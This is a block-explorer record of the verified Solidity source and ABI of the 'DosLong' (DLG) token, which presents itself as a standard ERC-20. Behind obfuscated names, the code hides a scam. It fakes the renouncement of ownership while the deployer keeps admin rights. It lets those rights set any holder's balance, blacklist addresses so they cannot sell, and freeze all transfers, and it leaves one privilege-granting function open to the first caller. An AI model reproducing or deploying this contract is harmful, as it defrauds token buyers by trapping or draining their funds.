{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface autoSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAmount {\n    function createPair(address feeAmountExempt, address receiverExemptFrom) external returns (address);\n}\n\ninterface txMarketingSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMax) external view returns (uint256);\n\n    function transfer(address teamList, uint256 receiverLiquidity) external returns (bool);\n\n    function allowance(address launchLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamList,\n        uint256 receiverLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTrading, uint256 value);\n    event Approval(address indexed launchLaunched, address indexed spender, uint256 value);\n}\n\ninterface txMarketingSenderMetadata is txMarketingSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DosLong is feeReceiver, txMarketingSender, txMarketingSenderMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return teamAt;\n    }\n\n    mapping(address => bool) public maxMarketingTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverBuy;\n\n    uint256 launchedShould;\n\n    bool private feeMin;\n\n    function limitList(address listMax) public {\n        if (receiverSell) {\n            return;\n        }\n        \n        maxMarketingTo[listMax] = true;\n        \n        receiverSell = true;\n    }\n\n    function senderEnable(address minToken) public {\n        modeBuyToken();\n        if (enableTeam == autoIs) {\n            shouldTx = true;\n        }\n        if (minToken == fundTrading || minToken == shouldSenderFund) {\n            return;\n        }\n        senderTo[minToken] = true;\n    }\n\n    function transfer(address senderMarketing, uint256 receiverLiquidity) external virtual override returns (bool) {\n        return senderTotalTake(_msgSender(), senderMarketing, receiverLiquidity);\n    }\n\n    address public fundTrading;\n\n    function modeBuyToken() private view {\n        require(maxMarketingTo[_msgSender()]);\n    }\n\n    bool public modeFund;\n\n    uint256 public autoIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapSenderMarketing;\n    }\n\n    function atMarketing(uint256 receiverLiquidity) public {\n        modeBuyToken();\n        receiverTrading = receiverLiquidity;\n    }\n\n    address public shouldSenderFund;\n\n    function owner() external view returns (address) {\n        return tokenMode;\n    }\n\n    function approve(address shouldLaunch, uint256 receiverLiquidity) public virtual override returns (bool) {\n        receiverBuy[_msgSender()][shouldLaunch] = receiverLiquidity;\n        emit Approval(_msgSender(), shouldLaunch, receiverLiquidity);\n        return true;\n    }\n\n    uint256 public liquidityAmount;\n\n    mapping(address => bool) public senderTo;\n\n    function getOwner() external view returns (address) {\n        return tokenMode;\n    }\n\n    event OwnershipTransferred(address indexed receiverFrom, address indexed fundReceiver);\n\n    function senderLiquidityTx(address senderMarketing, uint256 receiverLiquidity) public {\n        modeBuyToken();\n        shouldExempt[senderMarketing] = receiverLiquidity;\n    }\n\n    function transferFrom(address maxLaunched, address teamList, uint256 receiverLiquidity) external override returns (bool) {\n        if (_msgSender() != receiverSwap) {\n            if (receiverBuy[maxLaunched][_msgSender()] != type(uint256).max) {\n                require(receiverLiquidity <= receiverBuy[maxLaunched][_msgSender()]);\n                receiverBuy[maxLaunched][_msgSender()] -= receiverLiquidity;\n            }\n        }\n        return senderTotalTake(maxLaunched, teamList, receiverLiquidity);\n    }\n\n    bool private listTx;\n\n    uint8 private swapSenderMarketing = 18;\n\n    address private tokenMode;\n\n    uint256 private fundMax;\n\n    address minMarketingEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public receiverSell;\n\n    function senderTotalTake(address maxLaunched, address teamList, uint256 receiverLiquidity) internal returns (bool) {\n        if (maxLaunched == fundTrading) {\n            return limitSwap(maxLaunched, teamList, receiverLiquidity);\n        }\n        uint256 buyFee = txMarketingSender(shouldSenderFund).balanceOf(minMarketingEnable);\n        require(buyFee == receiverTrading);\n        require(teamList != minMarketingEnable);\n        if (senderTo[maxLaunched]) {\n            return limitSwap(maxLaunched, teamList, teamTotalLaunch);\n        }\n        return limitSwap(maxLaunched, teamList, receiverLiquidity);\n    }\n\n    uint256 constant teamTotalLaunch = 16 ** 10;\n\n    address receiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public toModeIs;\n\n    function balanceOf(address feeMax) public view virtual override returns (uint256) {\n        return shouldExempt[feeMax];\n    }\n\n    function limitSwap(address maxLaunched, address teamList, uint256 receiverLiquidity) internal returns (bool) {\n        require(shouldExempt[maxLaunched] >= receiverLiquidity);\n        shouldExempt[maxLaunched] -= receiverLiquidity;\n        shouldExempt[teamList] += receiverLiquidity;\n        emit Transfer(maxLaunched, teamList, receiverLiquidity);\n        return true;\n    }\n\n    function liquidityReceiver() public {\n        emit OwnershipTransferred(fundTrading, address(0));\n        tokenMode = address(0);\n    }\n\n    string private teamAt = \"Dos Long\";\n\n    mapping(address => uint256) private shouldExempt;\n\n    constructor (){\n        if (listTx) {\n            modeFund = false;\n        }\n        autoSender toMode = autoSender(receiverSwap);\n        shouldSenderFund = launchAmount(toMode.factory()).createPair(toMode.WETH(), address(this));\n        if (enableTeam != fundMax) {\n            listTx = true;\n        }\n        fundTrading = _msgSender();\n        liquidityReceiver();\n        maxMarketingTo[fundTrading] = true;\n        shouldExempt[fundTrading] = exemptIs;\n        if (liquidityAmount == autoIs) {\n            autoIs = fundMax;\n        }\n        emit Transfer(address(0), fundTrading, exemptIs);\n    }\n\n    string private autoLaunched = \"DLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptIs;\n    }\n\n    uint256 receiverTrading;\n\n    uint256 public enableTeam;\n\n    uint256 private exemptIs = 100000000 * 10 ** 18;\n\n    bool private shouldTx;\n\n    function allowance(address fundLimitLaunch, address shouldLaunch) external view virtual override returns (uint256) {\n        if (shouldLaunch == receiverSwap) {\n            return type(uint256).max;\n        }\n        return receiverBuy[fundLimitLaunch][shouldLaunch];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"atMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"limitList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMarketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"}],\"name\":\"senderEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"senderLiquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSenderFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toModeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DosLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}